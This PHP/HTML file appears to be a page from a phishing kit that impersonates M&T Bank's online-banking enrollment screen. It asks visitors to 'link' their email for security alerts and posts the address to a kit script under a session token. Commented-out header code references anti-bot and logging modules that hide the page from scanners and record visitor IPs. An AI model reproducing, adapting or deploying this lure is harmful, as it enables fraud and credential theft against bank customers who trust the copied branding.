<?php

    // session_start();

    // require_once '../Meta/Comp.php';
    // require_once '../Meta/Antibot.php';
    // require_once '../Meta/demonTest.php';

    // $comps = new Comp;
    // $antibot = new Antibot;

    // $settings = $comps->settings();

    // if (!$comps->checkToken()) {
    //     echo $antibot->throw404();
    //     $comps->log(
    //         "../../Guard/Audio/kill.txt",
    //         "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
    //     );
    //     die();
    // }

    // if (
    //     !isset($_SESSION['txtUserID']) ||
    //     $_SESSION['txtUserID'] == ""
    // ) {
    //     echo $antibot->throw404();
    //     $comps->log(
    //         "../../Guard/Audio/kill.txt",
    //         "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Skipping Pages\n\n"
    //     );
    //     die();
    // }

?>
<!doctype html>
<html lang="en" class="__sticky-footer">
<head>
    

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="css/foundation-all.css" rel="stylesheet" />
    <link href="css/mtb.css" rel="stylesheet" />
    
    <style>
        /*SUGGESTED ADD FOR THE FRAMEWORK*/

        .no-headerFooter > .mtb-page-header
        {
            display: none;
        }

        .no-headerFooter {
            padding-top: 1.5rem;
        }


    </style>
    
    <title>Enroll in Online Banking  - Verify Account   | M&T Bank</title>
    <link rel="shortcut icon" href="css/favicon.ico" type="image/x-icon" />
</head>
<body class="">

    

<header class="mtb-page-header">
    <a class="mtb__logo" href="#">
        <img class="mtb__logo" src="css/white logo.png" alt="M&T Bank" />
    </a>
    
        <a href="#" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
        </a>
</header>    
    <div data-msg-code="" 
         class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
    <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
    </div>
    <div class="mtb-app-enrollment--content">
        



<form action="../Meta/Benchmark/contact.php?token=<?php echo $_SESSION['token']; ?>"  class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post" name="verifyAccountForm">    <input type="hidden" value="R" name="EnrolleeType" id="EnrolleeType" />
    <input type="hidden" value="RetailAccount" name="EnrollmentType" id="EnrollmentType" />
    <input type="hidden" name="EnrolleeIdentifier" id="EnrolleeIdentifier" />
    <input type="hidden" name="EnrolleeToken" id="EnrolleeToken" />
    <input type="hidden" value="False" name="IsMobilePlatfom" id="IsMobilePlatfom" />
    <input type="hidden" value="OLB:MOE:VerifyYourAccountInfo" name="TagPageName" id="TagPageName" />
    <input type="hidden" value="False" name="SetFieldsToProtected" id="SetFieldsToProtected" />
        <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
            <div class="cell">
                

<!-- page title -->

    <div class="mtb-section-header mtb-section-header--top">
        <p class="__top-title">
        Alerts&nbsp; in Online Banking</p>
        <h1>
          Link your E-Mail </h1>
        <p>
          Link you E-Mail with your Account for Security Alerts&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.</p>
        <p>You will be redirected to your email provider to authenticate your email address.</p>
    </div>

            </div>

                <div class="cell">
                    


<div class="expanded button-group button-group__toggle">
           
            <div  data-ensightentag="CardInfoButton"  type="button" class="button js-enrolleeTypeTab active"  data-value="R" data-defaultaccounttype="RetailCard" data-url="#">E-Mail Address</div>
    </div>
                </div>

            






        </section>
    <div class="mtb-app-enrollment--content">
        



   
     <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
        
                <div class="cell">
                    


<div class="expanded button-group button-group__toggle">
             </div>
                </div>

            




      <div data-parentFor="FirstName" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
            <label for="FirstName">E-Mail</label>
            <input data-fcid="" value=""  maxlength="200" class="js-formnputItem" planceholder="Enter your E-Mail." data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="letters" placeholder=""  type="email" id="FirstName"  name="email" data-inputType="email" required="" >
            <p  class="form-error" id=FirstNameError role="alert"></p>
            <p class="form-help-text"></p>
        </div>
        
        
        
        
     
         
        </section>
        <section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
            

    <div class="cell">
            <button  data-ensightentag=ContinueButton name="account_verify" type="submit" data-url="" class="button button__form js-submit" >
                Continue
            </button>
    </div>
    <div class="cell">
            
    </div>

        </section>
</form>
        
        


<div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false">

    <div class="mtb-reveal-title ">
    </div>

    <div class="mtb-reveal-body">
  

    </div>

        <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
            
    <div class="cell small-6">
        <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
    </div>
    <div class="cell small-6">
        <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
    </div>

        </div>
</div>

    </div>
        
</form>
        
        


<div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false">

    <div class="mtb-reveal-title ">
        <h1>Timeout Message</h1>
    </div>

    <div class="mtb-reveal-body">
        
    <div class="cell">
        <p>Your online banking session has been inactive for 9 minutes. For your security, we will automatically log you out in 1 minute. Click Stay Online to continue your session.</p>
    </div>

    </div>

        <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
            
    <div class="cell small-6">
        <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
    </div>
    <div class="cell small-6">
        <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
    </div>

        </div>
</div>

<input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility" />
    </div>

    
<footer class="mtb-footer" role="contentinfo">
    <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
        <div class="cell">
            <p>
                &copy;2022 M&amp;T Bank. All Rights Reserved.<br>
                Users of this website agree to be bound by the provisions of the M&amp;T website <a href="#" target="_blank">Terms of Use</a> and <a href="#" target="_blank">Privacy Policy</a>.
            </p>
            <div class="mtb-footer__logo">
                <a href="#" target="_blank">
                    <img src="css/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                </a>
                <a href="#" target="_blank">
                    <img src="css/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                </a>
            </div>
            <p>
                Equal Housing Lender. NMLS #381076<br>
                <a href="#" target="_blank">Member FDIC.</a>
            </p>
        </div>
    </div>
</footer>
 

    

    <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
        <div class="mtb-spinner--triple-dot">
            <div></div>
            <div></div>
            <div></div>
            <span class="show-for-sr">Loading ...</span>
        </div>
    </div>

</body>
</html>